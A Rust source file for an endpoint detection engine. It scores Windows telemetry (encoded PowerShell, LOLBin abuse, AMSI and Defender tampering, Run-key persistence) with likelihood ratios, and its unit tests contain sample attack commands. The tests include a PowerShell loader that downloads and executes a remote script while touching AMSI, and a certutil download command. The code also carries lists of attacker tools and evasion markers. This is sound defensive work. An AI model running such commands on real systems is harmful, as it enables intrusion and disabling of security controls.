//! Detection rules.
//!
//! Each rule is a pure function of one event plus the facts the engine has
//! already established about the process that emitted it. Nothing here touches
//! state, which is what makes every rule testable from a literal.
//!
//! A rule returns a [`Likelihood`], not a verdict. That distinction is the
//! whole point of A5: a rule is evidence, and evidence is a pair of conditional
//! probabilities — how often it fires when the host is compromised, and how
//! often it fires when it is not. The second number is the one that is usually
//! missing from a detection, and it is the one that decides whether a rule is
//! worth anything. `-EncodedCommand` in a command line is *strong* evidence
//! (`hit` high, `miss` low); a DNS query to an unusual TLD is *weak* evidence
//! (`hit` modest, `miss` not much lower), and a pipeline that cannot express
//! the difference will drown in the second kind.

use asmr::infer::Likelihood;
use model::{EventKind, TelemetryEvent};

/// One piece of evidence, with the rule that produced it.
#[derive(Debug, Clone, PartialEq)]
pub struct Finding {
    pub rule: &'static str,
    /// MITRE ATT&CK technique, for the alert body.
    pub technique: &'static str,
    pub likelihood: Likelihood,
    /// Human-readable reason. Redacted before it leaves the host.
    pub detail: Box<str>,
}

/// Facts about the emitting process, established by the engine.
///
/// These are what turn a single event into a *behaviour*: an event is only
/// interesting next to where it came from.
#[derive(Debug, Clone, Default)]
pub struct Facts<'a> {
    pub image: Option<&'a str>,
    pub command_line: Option<&'a str>,
    pub parent_image: Option<&'a str>,
    /// Whether this image has been seen on this host before (A22).
    pub image_is_novel: bool,
    /// How many other children this process has already produced.
    pub siblings: u32,
}

/// Build a likelihood from a pair of conditional probabilities.
///
/// Both arguments are clamped strictly positive: a `miss` of zero would be a
/// rule with no false positives at all, which is a claim no rule in this file
/// is entitled to make, and it would also make the log-ratio infinite.
fn evidence(hit: f64, miss: f64) -> Likelihood {
    Likelihood::new(hit.clamp(1e-4, 1.0), miss.clamp(1e-4, 1.0))
}

/// Interpreters that are suspicious when they are the *child*.
const INTERPRETERS: &[&str] = &[
    "cmd.exe",
    "powershell.exe",
    "pwsh.exe",
    "wscript.exe",
    "cscript.exe",
    "mshta.exe",
    "rundll32.exe",
    "regsvr32.exe",
    "certutil.exe",
    "bitsadmin.exe",
];

/// Host applications that are widely used as a first stage because they are
/// trusted and already running.
const OFFICE_AND_BROWSERS: &[&str] = &[
    "winword.exe",
    "excel.exe",
    "powerpnt.exe",
    "outlook.exe",
    "msaccess.exe",
    "acrord32.exe",
    "chrome.exe",
    "firefox.exe",
    "msedge.exe",
];

/// Names that a binary is only allowed to have in `System32`.
const SYSTEM_NAMES: &[&str] = &[
    "svchost",
    "lsass",
    "csrss",
    "winlogon",
    "services",
    "smss",
    "wininit",
    "explorer",
    "taskhostw",
    "spoolsv",
    "dllhost",
];

/// Signed Windows binaries that are routinely abused to do work the attacker
/// did not have to write code for.
const LOLBINS: &[&str] = &[
    "certutil",
    "bitsadmin",
    "regsvr32",
    "rundll32",
    "mshta",
    "wmic",
    "msbuild",
    "installutil",
    "regasm",
    "regsvcs",
];

/// TLDs with abuse rates far above their share of the namespace. Weak evidence
/// on its own, which is exactly why it carries a `miss` close to its `hit`.
const HIGH_ABUSE_TLDS: &[&str] = &[
    ".top", ".xyz", ".tk", ".ml", ".ga", ".cf", ".gq", ".work", ".click", ".zip",
];

const WRITABLE_MARKERS: &[&str] = &[
    "\\temp\\",
    "\\tmp\\",
    "\\appdata\\",
    "\\downloads\\",
    "\\public\\",
    "\\programdata\\",
    "\\users\\",
];

/// Lowercased final path component.
fn base_name(path: &str) -> String {
    path.rsplit(['\\', '/'])
        .next()
        .unwrap_or(path)
        .to_ascii_lowercase()
}

/// Lowercased final path component without its extension.
fn stem(path: &str) -> String {
    let name = base_name(path);
    match name.rfind('.') {
        Some(i) => name[..i].to_string(),
        None => name,
    }
}

fn lower(s: &str) -> String {
    s.to_ascii_lowercase()
}

/// Whether a location is one an ordinary user can write to.
///
/// This is the precision test that matters, and getting it wrong is the classic
/// way to build a rule that screams on every workstation: several real system
/// binaries do not live in `System32` at all. `explorer.exe` is a legitimate
/// Windows component that runs from `C:\Windows`, so "not in System32" is not a
/// signal. "Runnable from somewhere the user can write" is.
fn in_writable_location(path: &str) -> bool {
    let lower = lower(path);
    WRITABLE_MARKERS.iter().any(|m| lower.contains(m))
}

/// Evaluate every rule against one event.
pub fn evaluate(event: &TelemetryEvent, facts: &Facts<'_>) -> Vec<Finding> {
    let mut findings = Vec::new();
    for rule in [
        encoded_interpreter as fn(&TelemetryEvent, &Facts<'_>) -> Option<Finding>,
        interpreter_from_host_app,
        masquerading_outside_system32,
        lolbin_network_use,
        run_key_persistence,
        high_abuse_tld,
        novel_binary_in_writable_location,
        process_fanout_burst,
        script_block_encoded_command,
        script_block_obfuscated,
        script_block_remote_fetch,
        script_block_defence_evasion,
    ] {
        if let Some(finding) = rule(event, facts) {
            findings.push(finding);
        }
    }
    findings
}

/// T1059.001: a shell invoked with an encoded command.
///
/// The encoding is the signal, not the payload. An analyst cannot read the
/// command line, which is precisely why the argument is used to hide one.
fn encoded_interpreter(event: &TelemetryEvent, facts: &Facts<'_>) -> Option<Finding> {
    let EventKind::ProcessStart(start) = &event.kind else {
        return None;
    };
    let image = facts.image.unwrap_or(&start.executable);
    if !matches!(base_name(image).as_str(), "powershell.exe" | "pwsh.exe") {
        return None;
    }

    let cmd = facts.command_line.or(start.command_line.as_deref())?;
    let lower = lower(cmd);
    let encoded = lower.contains("-encodedcommand")
        || lower.contains("-enc ")
        || lower.contains("-e ")
        || lower.contains("-ec ");
    if !encoded {
        return None;
    }

    let hidden = lower.contains("-windowstyle hidden") || lower.contains("-w hidden");
    Some(Finding {
        rule: "encoded_powershell",
        technique: "T1059.001",
        // The hidden-window flag co-occurring is a further, independent tell.
        likelihood: if hidden {
            evidence(0.92, 0.010)
        } else {
            evidence(0.72, 0.020)
        },
        detail: format!("encoded command line, hidden={hidden}").into(),
    })
}

/// T1590 has no bearing here; these are the tells in what an interpreter was
/// asked to run, read from a script block rather than a command line.
///
/// Why this is worth having at all: `Microsoft-Windows-Kernel-Process` carries no
/// command line on any Windows build, so the `encoded_interpreter` rule above can
/// only fire if something else supplies one. A 4104 does, for PowerShell, and it
/// carries the *whole script* rather than the first 260 characters of a command
/// line — which is where a staged loader keeps its payload.
///
/// Every rule here reads only the text and reports only which pattern matched. It
/// does not quote the script: an alert body is minimised before it leaves the host
/// (A19), and the script is the most sensitive thing on the machine.
fn script_block(event: &TelemetryEvent) -> Option<&model::ScriptBlock> {
    match &event.kind {
        EventKind::ScriptBlock(block) => Some(block),
        _ => None,
    }
}

/// How long a base64-looking run has to be before it is an encoded command rather
/// than a word that happens to end in `-enc`.
const MIN_ENCODED_BLOB: usize = 20;

/// Whether `text` contains an argument that hands the interpreter an encoded
/// command.
///
/// Deliberately not a bare `-e `: that matches English prose. What is checked is
/// the `-enc` family followed by a token long enough and shaped enough to be
/// base64, which is the thing an analyst cannot read.
fn has_encoded_command(text: &str) -> bool {
    let lower = lower(text);
    if lower.contains("-encodedcommand") || lower.contains("-encodedarguments") {
        return true;
    }

    for marker in ["-enc ", "-enc(", "-ec ", "-en "] {
        let Some(at) = lower.find(marker) else {
            continue;
        };
        let blob = lower[at + marker.len()..].trim_start();
        let run = blob
            .split(|c: char| c.is_whitespace() || c == '\'' || c == '"')
            .next()
            .unwrap_or_default();
        if run.len() >= MIN_ENCODED_BLOB
            && run
                .chars()
                .all(|c| c.is_ascii_alphanumeric() || c == '+' || c == '/' || c == '=')
        {
            return true;
        }
    }
    false
}

/// T1059.001: PowerShell handed an encoded command through the script itself.
fn script_block_encoded_command(event: &TelemetryEvent, _facts: &Facts<'_>) -> Option<Finding> {
    let block = script_block(event)?;
    if !has_encoded_command(&block.text) {
        return None;
    }

    Some(Finding {
        rule: "script_block_encoded_command",
        technique: "T1059.001",
        // Stronger than the command-line version of the same tell: a script that
        // encodes an argument rather than writing it is doing so on purpose.
        likelihood: evidence(0.80, 0.015),
        detail: "script block passes an encoded command".into(),
    })
}

/// Patterns that exist to make a script unreadable rather than to do work.
const OBFUSCATION_MARKERS: &[&str] = &[
    "frombase64string",
    "invoke-expression",
    "iex(",
    "iex ",
    "|iex",
    "[scriptblock]::create",
    "-bxor",
    "-join[char",
    "[char[]]",
    "[text.encoding]::",
];

/// T1140: the script decodes or assembles itself before running.
fn script_block_obfuscated(event: &TelemetryEvent, _facts: &Facts<'_>) -> Option<Finding> {
    let block = script_block(event)?;
    let lower = lower(&block.text);
    let marker = OBFUSCATION_MARKERS.iter().find(|m| lower.contains(**m))?;

    Some(Finding {
        rule: "script_block_obfuscated",
        technique: "T1140",
        // `Invoke-Expression` on its own is common in real automation, so this is
        // deliberately weaker than the encoding rule above and says which pattern
        // it matched so an analyst can judge it.
        likelihood: evidence(0.55, 0.030),
        detail: format!("script block contains {marker}").into(),
    })
}

/// Ways a script reaches out for something it will then run.
const REMOTE_FETCH_MARKERS: &[&str] = &[
    "downloadstring",
    "downloaddata",
    "downloadfile",
    "net.webclient",
    "start-bitstransfer",
    "invoke-webrequest",
    "invoke-restmethod",
    "wget ",
    "curl ",
];

/// T1105: the script fetches something over the network.
///
/// Weak on its own — plenty of legitimate automation downloads — which is why the
/// likelihood is modest and the threshold is what decides. A fetch *and* an
/// execution pattern is what an intrusion looks like, and the two findings add.
fn script_block_remote_fetch(event: &TelemetryEvent, _facts: &Facts<'_>) -> Option<Finding> {
    let block = script_block(event)?;
    let lower = lower(&block.text);
    let marker = REMOTE_FETCH_MARKERS.iter().find(|m| lower.contains(**m))?;

    Some(Finding {
        rule: "script_block_remote_fetch",
        technique: "T1105",
        likelihood: evidence(0.45, 0.050),
        detail: format!("script block contains {marker}").into(),
    })
}

/// Attempts to switch the defences off from inside a script.
const DEFENCE_EVASION_MARKERS: &[&str] = &[
    "amsiutils",
    "amsiinitfailed",
    "amsiscanbuffer",
    "set-mppreference",
    "add-mppreference",
    "exclusionpath",
    "exclusionprocess",
    "disableantispyware",
    "disablebehaviormonitoring",
    "disableioavprotection",
];

/// T1562.001: the script tampers with the security product on the host.
///
/// The narrowest rule in the file, and the strongest per false positive: real
/// automation has almost no reason to touch AMSI or Defender exclusions from
/// inside a script block, and malware has no other way to get its payload past
/// the scanner.
fn script_block_defence_evasion(event: &TelemetryEvent, _facts: &Facts<'_>) -> Option<Finding> {
    let block = script_block(event)?;
    let lower = lower(&block.text);
    let marker = DEFENCE_EVASION_MARKERS
        .iter()
        .find(|m| lower.contains(**m))?;

    Some(Finding {
        rule: "script_block_defence_evasion",
        technique: "T1562.001",
        likelihood: evidence(0.65, 0.005),
        detail: format!("script block contains {marker}").into(),
    })
}

/// T1566 / T1059: an interpreter launched by an application that has no
/// business launching one.
fn interpreter_from_host_app(event: &TelemetryEvent, facts: &Facts<'_>) -> Option<Finding> {
    let EventKind::ProcessStart(start) = &event.kind else {
        return None;
    };
    let image = base_name(facts.image.unwrap_or(&start.executable));
    if !INTERPRETERS.contains(&image.as_str()) {
        return None;
    }
    let parent = base_name(facts.parent_image?);
    if !OFFICE_AND_BROWSERS.contains(&parent.as_str()) {
        return None;
    }

    Some(Finding {
        rule: "interpreter_from_host_app",
        technique: "T1059",
        likelihood: evidence(0.55, 0.040),
        detail: format!("{parent} spawned {image}").into(),
    })
}

/// T1036.005: a process carrying a system binary's name, running from
/// somewhere a system binary never runs from.
///
/// Location is what makes the name a lie. `svchost.exe` in `System32` is
/// mundane, `svchost.exe` under `%TEMP%` has no benign reading, and
/// `explorer.exe` in `C:\Windows` is simply Windows — which is why the test is
/// "writable location" rather than "not System32".
fn masquerading_outside_system32(event: &TelemetryEvent, facts: &Facts<'_>) -> Option<Finding> {
    let EventKind::ProcessStart(start) = &event.kind else {
        return None;
    };
    let image = facts.image.unwrap_or(&start.executable);
    if !SYSTEM_NAMES.contains(&stem(image).as_str()) {
        return None;
    }
    if !in_writable_location(image) {
        return None;
    }

    Some(Finding {
        rule: "masquerading_outside_system32",
        technique: "T1036.005",
        likelihood: evidence(0.88, 0.015),
        detail: format!("{image} is a system name in a writable location").into(),
    })
}

/// T1218: a signed binary asked to fetch or execute something remote.
fn lolbin_network_use(event: &TelemetryEvent, facts: &Facts<'_>) -> Option<Finding> {
    let EventKind::ProcessStart(start) = &event.kind else {
        return None;
    };
    let image = stem(facts.image.unwrap_or(&start.executable));
    if !LOLBINS.contains(&image.as_str()) {
        return None;
    }

    let cmd = lower(facts.command_line.or(start.command_line.as_deref())?);
    let remote = cmd.contains("http://")
        || cmd.contains("https://")
        || cmd.contains("urlcache")
        || cmd.contains("/i:http")
        || cmd.contains("ftp://");
    if !remote {
        return None;
    }

    Some(Finding {
        rule: "lolbin_remote_fetch",
        technique: "T1218",
        likelihood: evidence(0.68, 0.025),
        detail: format!("{image} used against a remote location").into(),
    })
}

/// T1547.001: a value written under a Run key.
fn run_key_persistence(event: &TelemetryEvent, _facts: &Facts<'_>) -> Option<Finding> {
    let EventKind::RegistrySet(set) = &event.kind else {
        return None;
    };
    let key = lower(&set.key_path);
    let persistent = key.contains("\\currentversion\\run")
        || key.contains("\\currentversion\\runonce")
        || key.contains("\\winlogon\\shell")
        || key.contains("\\currentversion\\explorer\\shell folders");
    if !persistent {
        return None;
    }

    Some(Finding {
        rule: "run_key_persistence",
        technique: "T1547.001",
        // A Run key is not automatically malicious — installers use it — but
        // the benign rate is low enough that the ratio is still strong.
        likelihood: evidence(0.62, 0.008),
        detail: format!("{} written", set.key_path).into(),
    })
}

/// T1071.004: name resolution against a namespace with a high abuse rate.
fn high_abuse_tld(event: &TelemetryEvent, facts: &Facts<'_>) -> Option<Finding> {
    let _ = facts;
    let EventKind::DnsQuery(dns) = &event.kind else {
        return None;
    };
    let name = lower(&dns.query_name);
    if !HIGH_ABUSE_TLDS.iter().any(|tld| name.ends_with(tld)) {
        return None;
    }

    Some(Finding {
        rule: "high_abuse_tld",
        technique: "T1071.004",
        // Deliberately weak. Half the internet resolves these TLDs daily.
        likelihood: evidence(0.30, 0.070),
        detail: format!("{} in a high-abuse namespace", dns.query_name).into(),
    })
}

/// A22 + T1036: an executable the host has never seen, running from a
/// location any user can write to.
///
/// Neither half is strong alone. Novelty fires on every software update, and
/// `%TEMP%` is where installers work. Together they are a good description of
/// a dropped payload, which is why this rule exists as a conjunction rather
/// than as two more rows in the alert queue.
fn novel_binary_in_writable_location(event: &TelemetryEvent, facts: &Facts<'_>) -> Option<Finding> {
    let EventKind::ProcessStart(start) = &event.kind else {
        return None;
    };
    if !facts.image_is_novel {
        return None;
    }
    let image = facts.image.unwrap_or(&start.executable);
    if !in_writable_location(image) {
        return None;
    }

    Some(Finding {
        rule: "novel_binary_in_writable_location",
        technique: "T1036",
        likelihood: evidence(0.45, 0.030),
        detail: format!("first sighting of {image} from a writable location").into(),
    })
}

/// A23: one process producing an unusual number of children inside one window.
///
/// Structural rather than value-based: no individual spawn is remarkable, and
/// the signal exists only in the shape of the tree.
fn process_fanout_burst(event: &TelemetryEvent, facts: &Facts<'_>) -> Option<Finding> {
    let EventKind::ProcessStart(_) = &event.kind else {
        return None;
    };
    if facts.siblings < 8 {
        return None;
    }

    Some(Finding {
        rule: "process_fanout_burst",
        technique: "T1055",
        // Rises with the fan-out: eight children is a build system, forty is
        // not.
        likelihood: if facts.siblings >= 32 {
            evidence(0.50, 0.020)
        } else {
            evidence(0.25, 0.060)
        },
        detail: format!("parent has produced {} children", facts.siblings).into(),
    })
}

/// A human name for a rule, for an alert title.
///
/// Deliberately not the rule id. The alert table already carries the technique
/// in its own column, so a title of `T1547.001: T1547.001: ...` spends the one
/// place a person actually reads a sentence on repeating a code they have
/// already been shown.
pub fn rule_title(rule: &str) -> &'static str {
    match rule {
        "encoded_powershell" => "Encoded PowerShell command",
        "interpreter_from_host_app" => "Interpreter spawned by a host application",
        "masquerading_outside_system32" => "System binary name outside a system directory",
        "lolbin_remote_fetch" => "Signed binary used against a remote location",
        "run_key_persistence" => "Persistence via a Run key",
        "high_abuse_tld" => "Resolution in a high-abuse namespace",
        "novel_binary_in_writable_location" => "First sighting of a binary in a writable location",
        "process_fanout_burst" => "Unusual process fan-out",
        "script_block_encoded_command" => "PowerShell script with an encoded command",
        "script_block_obfuscated" => "PowerShell script that decodes itself",
        "script_block_remote_fetch" => "PowerShell script fetching from the network",
        "script_block_defence_evasion" => "PowerShell script touching the defences",
        _ => "Suspicious activity",
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use model::{DnsQueryPayload, EventId, HostId, Payload, ProcessId, ProcessStart, RegistrySet};
    use model::{EventKind, Value};

    fn event(kind: EventKind) -> TelemetryEvent {
        TelemetryEvent::new(
            EventId::new(1),
            HostId::new("host-a").unwrap(),
            chrono::Utc::now(),
            model::EventSource::WindowsEtw,
            model::ProviderId::new("p"),
            1,
            100,
            200,
            4,
            kind,
            Payload::new(Value::Null).unwrap(),
        )
    }

    fn process_start(image: &str, command_line: Option<&str>) -> TelemetryEvent {
        event(EventKind::ProcessStart(ProcessStart {
            pid: ProcessId::new(100),
            parent_pid: Some(ProcessId::new(4)),
            executable: image.into(),
            command_line: command_line.map(Into::into),
            user: None,
            working_directory: None,
            started_at: chrono::Utc::now(),
            image_hash: None,
            integrity_level: None,
        }))
    }

    fn rule_names(findings: &[Finding]) -> Vec<&str> {
        findings.iter().map(|f| f.rule).collect()
    }

    /// A PowerShell script block, as the sensor would build one from a 4104.
    fn script_block(text: &str) -> TelemetryEvent {
        event(EventKind::ScriptBlock(model::ScriptBlock {
            pid: ProcessId::new(100),
            text: text.into(),
            script_block_id: Some("{block}".into()),
            path: None,
            message_number: Some(1),
            message_total: Some(1),
            recorded_at: chrono::Utc::now(),
        }))
    }

    #[test]
    fn an_encoded_command_in_a_script_block_is_strong_evidence() {
        // The whole point of supporting 4104: the process provider carries no
        // command line on any Windows build, so without this T1059.001 can only
        // fire on a fixture.
        let e = script_block(
            "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACkA",
        );
        let findings = evaluate(&e, &Facts::default());
        assert_eq!(rule_names(&findings), vec!["script_block_encoded_command"]);
        assert_eq!(findings[0].technique, "T1059.001");
        assert!(findings[0].likelihood.log_ratio() > 3.0, "must be strong");
    }

    #[test]
    fn an_encoded_command_is_not_confused_with_prose_ending_in_e() {
        // A bare `-e ` used to be enough, and it matches English. What is checked
        // now is the argument shape, so a script that merely mentions the word
        // stays quiet.
        for innocent in [
            "Write-Host 'see -e below'",
            "Get-ChildItem -enc",
            "Write-Output 'the -enc flag is undocumented'",
            "$x = -enc",
        ] {
            let findings = evaluate(&script_block(innocent), &Facts::default());
            assert!(
                !rule_names(&findings).contains(&"script_block_encoded_command"),
                "{innocent} must not read as an encoded command"
            );
        }

        // A short run of characters after `-enc` is a token, not a payload.
        assert!(!has_encoded_command("run -enc abc"));
        // A long one is a payload.
        assert!(has_encoded_command(&format!(
            "run -enc {}",
            "QUJD".repeat(10)
        )));
    }

    #[test]
    fn a_loader_fires_several_rules_and_they_add_up() {
        // The realistic shape: fetch, decode, run, with the defences turned off.
        // Separate findings rather than one verdict is the A5 design, so this
        // asserts the count and that the techniques differ.
        let e = script_block(
            "IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.5/a.ps1');\
             [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');",
        );
        let findings = evaluate(&e, &Facts::default());
        let names = rule_names(&findings);
        assert!(names.contains(&"script_block_obfuscated"), "{names:?}");
        assert!(names.contains(&"script_block_remote_fetch"), "{names:?}");
        assert!(names.contains(&"script_block_defence_evasion"), "{names:?}");

        let techniques: Vec<&str> = findings.iter().map(|f| f.technique).collect();
        assert!(techniques.contains(&"T1140"), "{techniques:?}");
        assert!(techniques.contains(&"T1105"), "{techniques:?}");
        assert!(techniques.contains(&"T1562.001"), "{techniques:?}");

        // Summed, this is not a close call.
        let total: f64 = findings.iter().map(|f| f.likelihood.log_ratio()).sum();
        assert!(total > 8.0, "a full loader should be overwhelming: {total}");
    }

    #[test]
    fn ordinary_administration_stays_quiet() {
        // A rule that fires on every script is worse than no rule, and the shapes
        // below are what a real estated admin script looks like.
        for innocent in [
            "Get-Service | Where-Object { $_.Status -eq 'Stopped' } | Start-Service",
            "Import-Module ActiveDirectory; Get-ADUser -Filter * -Properties LastLogonDate",
            "Get-ChildItem -Path C:\\Logs -Filter *.log | Remove-Item -WhatIf",
            "Write-Output 'deployment complete'",
            "$servers | ForEach-Object { Invoke-Command -ComputerName $_ { Get-Date } }",
        ] {
            let findings = evaluate(&script_block(innocent), &Facts::default());
            assert!(
                findings.is_empty(),
                "{innocent} produced {:?}",
                rule_names(&findings)
            );
        }
    }

    #[test]
    fn the_script_rules_only_read_script_blocks() {
        // The same text on a command line is the other rule's business. Firing
        // here as well would double-count one piece of evidence.
        let e = process_start(
            "powershell.exe",
            Some("powershell -enc SQBFAFgAKABOAGUAdwA"),
        );
        let findings = evaluate(&e, &Facts::default());
        let names = rule_names(&findings);
        assert_eq!(names, vec!["encoded_powershell"]);
        assert!(!names.iter().any(|n| n.starts_with("script_block_")));
    }

    #[test]
    fn a_script_block_reports_which_pattern_matched_and_not_the_script() {
        // The body is minimised before it leaves the host (A19) and the script is
        // the most sensitive thing on the machine, so the detail names the tell.
        let e = script_block("$c = 'topsecret'; IEX $c");
        let finding = evaluate(&e, &Facts::default()).remove(0);
        assert_eq!(finding.detail.as_ref(), "script block contains iex ");
        assert!(!finding.detail.contains("topsecret"));
    }

    #[test]
    fn encoded_powershell_is_strong_evidence() {
        let e = process_start(
            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            Some("powershell.exe -NoProfile -EncodedCommand SQBFAFgA"),
        );
        let findings = evaluate(&e, &Facts::default());
        assert_eq!(rule_names(&findings), vec!["encoded_powershell"]);
        assert_eq!(findings[0].technique, "T1059.001");
        assert!(findings[0].likelihood.log_ratio() > 3.0, "must be strong");
    }

    #[test]
    fn hiding_the_window_raises_the_likelihood_ratio() {
        let plain = process_start("powershell.exe", Some("powershell -enc AAAA"));
        let hidden = process_start(
            "powershell.exe",
            Some("powershell -enc AAAA -WindowStyle Hidden"),
        );

        let a = evaluate(&plain, &Facts::default()).remove(0);
        let b = evaluate(&hidden, &Facts::default()).remove(0);
        assert!(b.likelihood.log_ratio() > a.likelihood.log_ratio());
    }

    #[test]
    fn an_ordinary_powershell_invocation_is_not_evidence() {
        let e = process_start(
            "powershell.exe",
            Some("powershell.exe -Command Get-Process"),
        );
        assert!(evaluate(&e, &Facts::default()).is_empty());
    }

    #[test]
    fn a_plain_svchost_is_not_masquerading() {
        let e = process_start("C:\\Windows\\System32\\svchost.exe", None);
        assert!(evaluate(&e, &Facts::default()).is_empty());
    }

    #[test]
    fn explorer_in_windows_is_not_masquerading() {
        // The regression that a live run caught: `explorer.exe` legitimately
        // runs from C:\Windows, so "not in System32" flagged every workstation.
        let e = process_start("C:\\Windows\\explorer.exe", None);
        assert!(evaluate(&e, &Facts::default()).is_empty());

        let e = process_start("C:\\Windows\\SysWOW64\\explorer.exe", None);
        assert!(evaluate(&e, &Facts::default()).is_empty());
    }

    #[test]
    fn svchost_in_temp_is_masquerading() {
        let e = process_start("C:\\Users\\a\\AppData\\Local\\Temp\\svchost.exe", None);
        let findings = evaluate(&e, &Facts::default());
        assert!(rule_names(&findings).contains(&"masquerading_outside_system32"));
        // It is also novel-in-temp if the engine says so, but with the default
        // facts only the masquerade rule fires.
        assert_eq!(findings.len(), 1);
    }

    #[test]
    fn interpreter_parentage_needs_both_halves() {
        let e = process_start("cmd.exe", None);

        let from_word = Facts {
            parent_image: Some("C:\\Program Files\\winword.exe"),
            ..Default::default()
        };
        assert!(rule_names(&evaluate(&e, &from_word)).contains(&"interpreter_from_host_app"));

        let from_explorer = Facts {
            parent_image: Some("C:\\Windows\\explorer.exe"),
            ..Default::default()
        };
        assert!(!rule_names(&evaluate(&e, &from_explorer)).contains(&"interpreter_from_host_app"));
    }

    #[test]
    fn local_certutil_use_is_not_a_lolbin_finding() {
        let benign = process_start("certutil.exe", Some("certutil -hashfile a.txt MD5"));
        assert!(evaluate(&benign, &Facts::default()).is_empty());

        let abuse = process_start(
            "certutil.exe",
            Some("certutil -urlcache -f http://x/y.exe y.exe"),
        );
        let findings = evaluate(&abuse, &Facts::default());
        assert!(rule_names(&findings).contains(&"lolbin_remote_fetch"));
    }

    #[test]
    fn run_key_writes_are_detected_but_other_keys_are_not() {
        let persist = event(EventKind::RegistrySet(RegistrySet {
            pid: ProcessId::new(1),
            key_path: "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run".into(),
            value_name: Some("Updater".into()),
            value_data: None,
            set_at: chrono::Utc::now(),
        }));
        assert!(
            rule_names(&evaluate(&persist, &Facts::default())).contains(&"run_key_persistence")
        );

        let benign = event(EventKind::RegistrySet(RegistrySet {
            pid: ProcessId::new(1),
            key_path: "HKCU\\Software\\Microsoft\\Office\\16.0\\Common".into(),
            value_name: None,
            value_data: None,
            set_at: chrono::Utc::now(),
        }));
        assert!(evaluate(&benign, &Facts::default()).is_empty());
    }

    #[test]
    fn strong_evidence_outweighs_weak_evidence_by_a_wide_margin() {
        let dns = event(EventKind::DnsQuery(DnsQueryPayload {
            pid: ProcessId::new(1),
            query_name: "cdn.telemetry.xyz".into(),
            query_type: "A".into(),
            answers: Vec::new(),
            response_code: None,
            queried_at: chrono::Utc::now(),
        }));
        // Weak rule: 0.30 / 0.070, so log LR = ln(4.29)  ~= 1.46 bits.
        let weak = evaluate(&dns, &Facts::default()).remove(0);

        // Strong rule: 0.88 / 0.015, so log LR = ln(58.7) ~= 4.07.
        let strong = evaluate(
            &process_start("C:\\Temp\\svchost.exe", None),
            &Facts::default(),
        )
        .remove(0);

        assert!(weak.likelihood.log_ratio() < 1.5);
        assert!(strong.likelihood.log_ratio() > 4.0);
        // If the gap between the best and worst rule in the file ever closes,
        // the queue stops being ordered by anything meaningful.
        assert!(
            strong.likelihood.log_ratio() > weak.likelihood.log_ratio() * 2.5,
            "strong {} vs weak {}",
            strong.likelihood.log_ratio(),
            weak.likelihood.log_ratio()
        );
    }

    #[test]
    fn every_runnable_rule_has_a_human_title() {
        // A rule that falls through to the generic title is a rule whose
        // alerts read `Suspicious activity` and nothing else, which is the
        // sort of row an analyst learns to skip.
        const RULES: &[&str] = &[
            "encoded_powershell",
            "interpreter_from_host_app",
            "masquerading_outside_system32",
            "lolbin_remote_fetch",
            "run_key_persistence",
            "high_abuse_tld",
            "novel_binary_in_writable_location",
            "process_fanout_burst",
        ];
        for rule in RULES {
            let title = rule_title(rule);
            assert_ne!(title, "Suspicious activity", "{rule} has no title");
            assert!(!title.contains(rule), "{title} repeats the rule id");
        }
        assert_eq!(rule_title("never-heard-of-it"), "Suspicious activity");
    }

    #[test]
    fn fanout_needs_a_threshold_and_scales_with_it() {
        let e = process_start("C:\\Windows\\System32\\cmd.exe", None);

        let few = Facts {
            siblings: 3,
            ..Default::default()
        };
        assert!(evaluate(&e, &few).is_empty());

        let many = Facts {
            siblings: 12,
            ..Default::default()
        };
        let storm = Facts {
            siblings: 64,
            ..Default::default()
        };
        assert!(
            evaluate(&e, &storm)[0].likelihood.log_ratio()
                > evaluate(&e, &many)[0].likelihood.log_ratio()
        );
    }

    #[test]
    fn novelty_only_counts_in_a_writable_location() {
        let novel_temp = Facts {
            image_is_novel: true,
            ..Default::default()
        };
        let novel_system = process_start("C:\\Windows\\System32\\notepad.exe", None);
        assert!(rule_names(&evaluate(&novel_system, &novel_temp)).is_empty());

        let novel_tmp = process_start("C:\\Temp\\payload.exe", None);
        assert!(
            rule_names(&evaluate(&novel_tmp, &novel_temp))
                .contains(&"novel_binary_in_writable_location")
        );
    }
}
